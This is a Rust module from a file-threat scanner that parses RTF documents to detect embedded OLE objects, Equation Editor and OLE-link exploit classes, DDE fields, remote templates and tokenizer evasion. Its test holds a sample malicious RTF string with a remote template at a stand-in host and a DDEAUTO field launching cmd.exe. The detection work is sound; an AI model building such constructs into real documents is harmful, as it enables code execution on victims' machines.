//! RTF triage: embedded OLE objects (`\object`/`\objdata`), auto-updating
//! links (`\objupdate`), field instructions (`\fldinst`), remote templates
//! (`\*\template`), metadata (`\info`) and tokenizer-level obfuscation.
//!
//! RTF is the classic carrier for Equation Editor (CVE-2017-11882) and
//! OLE-link (CVE-2017-0199) exploits. The tokenizer mirrors Word's lenient
//! behaviour where it matters for detection: unknown ignorable destinations
//! (`{\*\foo ...}`) inside `\objdata` are skipped, non-hex characters in hex
//! data are ignored, and `\bin N` payloads are taken verbatim.

use arca_container::text::{CodePage, decode_codepage};

use crate::format::FileFormat;
use crate::report::{MetaKey, RefKind, Severity, ThreatKind};
use crate::{Abort, Ctx, fields, memfind, ooxml};

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Dest {
    Normal,
    ObjData,
    ObjClass,
    FldInst,
    Template,
    Info(MetaKey),
    Skip,
}

#[derive(Debug, Clone, Copy)]
struct Group {
    dest: Dest,
    /// Bytes that follow a `` escape and are its fallback rendering (`CN`, scoped to the group).
    uc: usize,
}

#[derive(Debug, Default)]
struct Object {
    depth: usize,
    class: String,
    hex: Vec<u8>,
    pending_nibble: Option<u8>,
    raw: Vec<u8>,
    auto_update: bool,
    link: bool,
    ocx: bool,
}

const MAX_GROUP_DEPTH: usize = 1024;
const MAX_OBJECT_BYTES: usize = 64 << 20;

fn hexval(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

struct Parser<'d> {
    data: &'d [u8],
    pos: usize,
    stack: Vec<Group>,
    codepage: CodePage,
    object: Option<Object>,
    objects: Vec<Object>,
    /// Open field instructions, outermost first: (group depth, text, keyword computed by a
    /// nested field).
    flds: Vec<(usize, String, bool)>,
    fields: Vec<(String, bool)>,
    template: Option<(usize, String)>,
    templates: Vec<String>,
    info: Option<(usize, MetaKey, String)>,
    meta: Vec<(MetaKey, String)>,
    overlong_words: u32,
    pending_ignorable: bool,
    uc_skip: usize,
    too_deep: bool,
}

impl<'d> Parser<'d> {
    fn new(data: &'d [u8]) -> Self {
        Self {
            data,
            pos: 0,
            stack: vec![Group { dest: Dest::Normal, uc: 1 }],
            codepage: CodePage::Windows1252,
            object: None,
            objects: Vec::new(),
            flds: Vec::new(),
            fields: Vec::new(),
            template: None,
            templates: Vec::new(),
            info: None,
            meta: Vec::new(),
            overlong_words: 0,
            pending_ignorable: false,
            uc_skip: 0,
            too_deep: false,
        }
    }

    fn dest(&self) -> Dest {
        self.stack.last().map_or(Dest::Normal, |g| g.dest)
    }

    fn set_dest(&mut self, d: Dest) {
        if let Some(g) = self.stack.last_mut() {
            g.dest = d;
        }
    }

    fn text_byte(&mut self, b: u8) {
        if self.uc_skip > 0 {
            self.uc_skip -= 1;
            return;
        }
        match self.dest() {
            Dest::ObjData => {
                if let (Some(o), Some(v)) = (self.object.as_mut(), hexval(b))
                    && o.hex.len() < MAX_OBJECT_BYTES
                {
                    match o.pending_nibble.take() {
                        Some(h) => o.hex.push((h << 4) | v),
                        None => o.pending_nibble = Some(v),
                    }
                }
            }
            Dest::ObjClass => {
                if let Some(o) = self.object.as_mut()
                    && o.class.len() < 256
                {
                    o.class.push(char::from(b));
                }
            }
            Dest::FldInst => {
                if let Some((_, s, _)) = self.flds.last_mut()
                    && s.len() < 8192
                {
                    s.push_str(&decode_codepage(&[b], self.codepage));
                }
            }
            Dest::Template => {
                if let Some((_, s)) = self.template.as_mut()
                    && s.len() < 4096
                {
                    s.push(char::from(b));
                }
            }
            Dest::Info(_) => {
                if let Some((_, _, s)) = self.info.as_mut()
                    && s.len() < 1024
                {
                    s.push_str(&decode_codepage(&[b], self.codepage));
                }
            }
            Dest::Normal | Dest::Skip => {}
        }
    }

    fn text_char(&mut self, c: char) {
        match self.dest() {
            Dest::FldInst => {
                if let Some((_, s, _)) = self.flds.last_mut()
                    && s.len() < 8192
                {
                    s.push(c);
                }
            }
            Dest::Info(_) => {
                if let Some((_, _, s)) = self.info.as_mut() {
                    s.push(c);
                }
            }
            Dest::Template => {
                if let Some((_, s)) = self.template.as_mut() {
                    s.push(c);
                }
            }
            _ => {}
        }
    }

    fn open_group(&mut self) {
        let inherited = self.stack.last().copied().unwrap_or(Group { dest: Dest::Normal, uc: 1 });
        if self.stack.len() >= MAX_GROUP_DEPTH {
            self.too_deep = true;
            return;
        }
        self.stack.push(inherited);
        self.pending_ignorable = false;
    }

    fn close_group(&mut self) {
        if self.stack.len() <= 1 {
            return;
        }
        self.stack.pop();
        let depth = self.stack.len();
        // Fields whose instruction group just closed. A nested field contributes to the
        // instruction of the one that encloses it (see `fields::nest`).
        while self.flds.last().is_some_and(|(d, _, _)| *d > depth) {
            let Some((_, s, computed)) = self.flds.pop() else { break };
            let mut keep = true;
            if let Some(parent) = self.flds.last_mut() {
                match fields::nest(&mut parent.1, &s) {
                    fields::Nested::Merged => keep = false,
                    fields::Nested::Keyword => parent.2 = true,
                    fields::Nested::Argument => {}
                }
            }
            if keep && self.fields.len() < 512 {
                self.fields.push((s, computed));
            }
        }
        if self.template.as_ref().is_some_and(|(d, _)| *d > depth)
            && let Some((_, s)) = self.template.take()
        {
            self.templates.push(s);
        }
        if self.info.as_ref().is_some_and(|(d, _, _)| *d > depth)
            && let Some((_, k, s)) = self.info.take()
        {
            self.meta.push((k, s));
        }
        if self.object.as_ref().is_some_and(|o| o.depth > depth)
            && let Some(o) = self.object.take()
            && self.objects.len() < 256
        {
            self.objects.push(o);
        }
    }

    fn control_word(&mut self, word: &str, param: Option<i64>) {
        let ignorable = core::mem::take(&mut self.pending_ignorable);
        let depth = self.stack.len();
        match word {
            "object" => {
                if self.object.is_none() {
                    self.object = Some(Object { depth, ..Object::default() });
                }
            }
            "objupdate" => self.object.as_mut().into_iter().for_each(|o| o.auto_update = true),
            "objlink" | "objautlink" => {
                self.object.as_mut().into_iter().for_each(|o| o.link = true)
            }
            "objocx" => self.object.as_mut().into_iter().for_each(|o| o.ocx = true),
            "objdata" => {
                if self.object.is_none() {
                    // \objdata outside \object is still loaded by Word.
                    self.object = Some(Object { depth, ..Object::default() });
                }
                self.set_dest(Dest::ObjData);
            }
            "objclass" => self.set_dest(Dest::ObjClass),
            "fldinst" => {
                self.flds.push((depth, String::new(), false));
                self.set_dest(Dest::FldInst);
            }
            "template" => {
                self.template = Some((depth, String::new()));
                self.set_dest(Dest::Template);
            }
            "ansicpg" => {
                if let Some(cp) = param.and_then(|p| u16::try_from(p).ok()) {
                    self.codepage = CodePage::from_id(cp);
                }
            }
            "uc" => {
                if let (Some(p), Some(g)) = (param, self.stack.last_mut()) {
                    g.uc = usize::try_from(p).unwrap_or(1).min(16);
                }
            }
            // The cached result of a field is not part of any instruction.
            "fldrslt" => self.set_dest(Dest::Skip),
            "u" => {
                if let Some(p) = param {
                    let v = if p < 0 { p + 65_536 } else { p };
                    if let Some(c) = u32::try_from(v).ok().and_then(char::from_u32) {
                        self.text_char(c);
                    }
                    self.uc_skip = self.stack.last().map_or(1, |g| g.uc);
                }
            }
            "bin" => {
                let n = param.and_then(|p| usize::try_from(p).ok()).unwrap_or(0);
                let end = self.pos.saturating_add(n).min(self.data.len());
                if self.dest() == Dest::ObjData
                    && let Some(o) = self.object.as_mut()
                    && let Some(bytes) = self.data.get(self.pos..end)
                    && o.raw.len().saturating_add(bytes.len()) <= MAX_OBJECT_BYTES
                {
                    o.raw.extend_from_slice(bytes);
                }
                self.pos = end;
            }
            "author" | "operator" | "company" | "title" | "subject" | "manager" | "category"
            | "keywords" | "doccomm" => {
                let key = match word {
                    "author" => MetaKey::Author,
                    "operator" => MetaKey::LastModifiedBy,
                    "company" => MetaKey::Company,
                    "title" => MetaKey::Title,
                    "subject" => MetaKey::Subject,
                    "manager" => MetaKey::Manager,
                    "category" => MetaKey::Category,
                    "keywords" => MetaKey::Keywords,
                    _ => MetaKey::Description,
                };
                self.info = Some((depth, key, String::new()));
                self.set_dest(Dest::Info(key));
            }
            "par" | "line" => self.text_char('\n'),
            "tab" => self.text_char('\t'),
            _ if ignorable => {
                // Unknown ignorable destination: Word skips its content.
                self.set_dest(Dest::Skip);
            }
            _ => {}
        }
    }

    fn run(&mut self) {
        while let Some(&b) = self.data.get(self.pos) {
            if self.too_deep {
                break;
            }
            self.pos += 1;
            match b {
                b'{' => self.open_group(),
                b'}' => self.close_group(),
                b'\\' => self.escape(),
                b'\r' | b'\n' => {}
                _ => self.text_byte(b),
            }
        }
        // Close everything still open.
        while self.stack.len() > 1 {
            self.close_group();
        }
        if let Some(o) = self.object.take() {
            self.objects.push(o);
        }
    }

    fn escape(&mut self) {
        let Some(&c) = self.data.get(self.pos) else { return };
        if c.is_ascii_alphabetic() {
            let start = self.pos;
            while self.data.get(self.pos).is_some_and(u8::is_ascii_alphabetic) {
                self.pos += 1;
            }
            let word_len = self.pos - start;
            if word_len > 32 {
                self.overlong_words += 1;
            }
            let word = String::from_utf8_lossy(self.data.get(start..self.pos).unwrap_or(&[]))
                .to_ascii_lowercase();
            let neg = self.data.get(self.pos) == Some(&b'-');
            if neg {
                self.pos += 1;
            }
            let dstart = self.pos;
            while self.data.get(self.pos).is_some_and(u8::is_ascii_digit) && self.pos - dstart < 10
            {
                self.pos += 1;
            }
            // Excess digits are part of the obfuscation trick; skip them.
            while self.data.get(self.pos).is_some_and(u8::is_ascii_digit) {
                self.pos += 1;
                self.overlong_words += 1;
            }
            let param = core::str::from_utf8(self.data.get(dstart..self.pos).unwrap_or(&[]))
                .ok()
                .and_then(|s| s.get(..s.len().min(10)))
                .and_then(|s| s.parse::<i64>().ok())
                .map(|v| if neg { -v } else { v });
            if self.data.get(self.pos) == Some(&b' ') {
                self.pos += 1;
            }
            self.control_word(&word, param);
            return;
        }
        self.pos += 1;
        match c {
            b'*' => self.pending_ignorable = true,
            b'\'' => {
                let h = self.data.get(self.pos).copied().and_then(hexval);
                let l = self.data.get(self.pos + 1).copied().and_then(hexval);
                if let (Some(h), Some(l)) = (h, l) {
                    self.pos += 2;
                    self.text_byte((h << 4) | l);
                }
            }
            b'{' | b'}' | b'\\' => self.text_byte(c),
            b'~' => self.text_char('\u{a0}'),
            _ => {}
        }
    }
}

/// Scans an RTF document.
pub(crate) fn scan(ctx: &mut Ctx<'_>, data: &[u8], loc: &str) -> Result<FileFormat, Abort> {
    ctx.identified(FileFormat::Rtf);
    if !data.starts_with(b"{\\rtf1") {
        ctx.report.add(
            ThreatKind::ObfuscatedName,
            loc,
            "non-standard RTF header (Word accepts any '{\\rt' prefix; a known evasion)",
        );
    }
    let mut p = Parser::new(data);
    p.run();
    if p.too_deep {
        ctx.report.add(
            ThreatKind::MalformedContainer,
            loc,
            format!("RTF group nesting exceeds {MAX_GROUP_DEPTH}"),
        );
    }
    if p.overlong_words > 0 {
        ctx.report.add(
            ThreatKind::ObfuscatedName,
            loc,
            format!(
                "{} over-long control word(s)/parameter(s) (tokenizer evasion)",
                p.overlong_words
            ),
        );
    }
    for (instr, computed_keyword) in &p.fields {
        fields::analyze_finished(
            ctx,
            &fields::Finished {
                index: 0,
                instr: instr.clone(),
                computed_keyword: *computed_keyword,
                merged: false,
            },
            loc,
        );
    }
    for t in &p.templates {
        let t = t.trim();
        if !t.is_empty() {
            ooxml::record_external(ctx, t, RefKind::Template, true, loc);
        }
    }
    let mut people = false;
    for (k, v) in &p.meta {
        people |= matches!(k, MetaKey::Author | MetaKey::LastModifiedBy);
        ctx.report.meta(*k, "", v, loc);
    }
    if people {
        ctx.report.add(ThreatKind::AuthorMetadata, loc, "author / operator names are stored");
    }
    for (n, obj) in p.objects.iter().enumerate() {
        let oloc = format!("{loc}#object{}", n + 1);
        scan_object(ctx, obj, &oloc)?;
    }
    Ok(FileFormat::Rtf)
}

fn scan_object(ctx: &mut Ctx<'_>, obj: &Object, loc: &str) -> Result<(), Abort> {
    let data: &[u8] = if obj.raw.is_empty() { &obj.hex } else { &obj.raw };
    let mut class = obj.class.trim().to_owned();
    let mut topic = String::new();
    let mut native: Option<&[u8]> = None;
    // OLE1 ObjectHeader: version, format id, class name, topic, item, native data.
    let mut r = arca_container::bytes::LeReader::new(data);
    let header = (|| {
        let _version = r.u32()?;
        let format_id = r.u32()?;
        let mut lp = || -> Option<String> {
            let len = usize::try_from(r.u32()?).ok()?;
            if len > 4096 {
                return None;
            }
            let s = r.bytes(len)?;
            Some(decode_codepage(s.split(|&b| b == 0).next().unwrap_or(s), CodePage::Windows1252))
        };
        let c = lp()?;
        let t = lp()?;
        let _item = lp()?;
        Some((format_id, c, t))
    })();
    if let Some((format_id, c, t)) = header {
        if class.is_empty() {
            class.clone_from(&c);
        }
        topic = t;
        if format_id == 2 {
            native = r.u32().and_then(|n| usize::try_from(n).ok()).and_then(|n| r.bytes(n));
        }
    }
    let lower = class.to_ascii_lowercase();
    let detail = format!("RTF object class {:?} ({} bytes of object data)", class, data.len());
    if lower.starts_with("equation.") {
        ctx.report.add(
            ThreatKind::ExploitableOleClass,
            loc,
            format!("{class}: Microsoft Equation Editor 3.0 (CVE-2017-11882, CVE-2018-0802)"),
        );
    } else if lower == "package" {
        ctx.report.add(ThreatKind::OlePackage, loc, "OLE Packager object in RTF");
    } else if lower.starts_with("htmlfile") || lower.starts_with("shell.explorer") {
        ctx.report.add(
            ThreatKind::ExploitableOleClass,
            loc,
            format!("{class}: HTML-rendering OLE class (CVE-2017-0199 pattern)"),
        );
    }
    ctx.report.add(ThreatKind::RtfEmbeddedObject, loc, detail);
    if obj.auto_update {
        ctx.report.add(
            ThreatKind::RtfAutoUpdateObject,
            loc,
            format!("\\objupdate forces object {class:?} to load when the document opens"),
        );
    }
    if obj.ocx {
        ctx.report.add(ThreatKind::ActiveXControl, loc, format!("ActiveX object {class:?} in RTF"));
    }
    if obj.link || (!topic.is_empty() && crate::url::leaves_package(&topic)) {
        if !topic.is_empty() {
            ooxml::record_external(ctx, &topic, RefKind::ObjectLink, true, loc);
        }
        ctx.report.add_with(
            ThreatKind::ExternalObjectLink,
            Severity::Critical,
            loc,
            format!("linked object source {topic:?}"),
        );
    }
    // Native data: an OLE2 storage (possibly after a prefix) or a package.
    let payload = native.unwrap_or(data);
    if let Some(at) = memfind(payload, &arca_container::cfb::SIGNATURE)
        && let Some(cfb) = payload.get(at..)
    {
        ctx.scan_nested(cfb, loc)?;
    } else if lower == "package"
        && let Some(n) = native
    {
        let mut stream = Vec::with_capacity(n.len() + 4);
        stream.extend_from_slice(&u32::try_from(n.len()).unwrap_or(0).to_le_bytes());
        stream.extend_from_slice(n);
        crate::ole::ole10_native(ctx, &stream, loc)?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tokenizer_extracts_destinations() {
        let rtf = br#"{\rtf1\ansi\ansicpg1251{\info{\author \'c8\'e2\'e0\'ed}{\company ACME}}{\*\template http://evil.example/t.dot}
{\field{\*\fldinst {DDEAUTO c:\\windows\\system32\\cmd.exe "/c calc"}}{\fldrslt x}}
{\object\objemb\objupdate{\*\objclass Equation.3}{\*\objdata 0105{\*\junk zz}0000 02 00}}}"#;
        let mut p = Parser::new(rtf);
        p.run();
        assert_eq!(
            p.meta,
            vec![(MetaKey::Author, "Иван".to_owned()), (MetaKey::Company, "ACME".to_owned())]
        );
        assert_eq!(p.templates, vec!["http://evil.example/t.dot".to_owned()]);
        assert!(p.fields.iter().any(|(f, _)| f.contains("DDEAUTO")), "{:?}", p.fields);
        assert_eq!(p.objects.len(), 1);
        let o = &p.objects[0];
        assert_eq!(o.class, "Equation.3");
        assert!(o.auto_update);
        assert_eq!(
            o.hex,
            vec![0x01, 0x05, 0x00, 0x00, 0x02, 0x00],
            "junk destination must be skipped"
        );
    }

    #[test]
    fn deep_nesting_is_bounded() {
        let mut rtf = b"{\\rtf1".to_vec();
        rtf.extend(std::iter::repeat_n(b'{', 100_000));
        let mut p = Parser::new(&rtf);
        p.run();
        assert!(p.too_deep);
    }

    #[test]
    fn overlong_control_words_are_counted() {
        let rtf =
            format!("{{\\rtf1{{\\object{}x\\objdata 01}}}}", String::from("\\a") + &"b".repeat(40));
        let mut p = Parser::new(rtf.as_bytes());
        p.run();
        assert!(p.overlong_words > 0);
    }
}
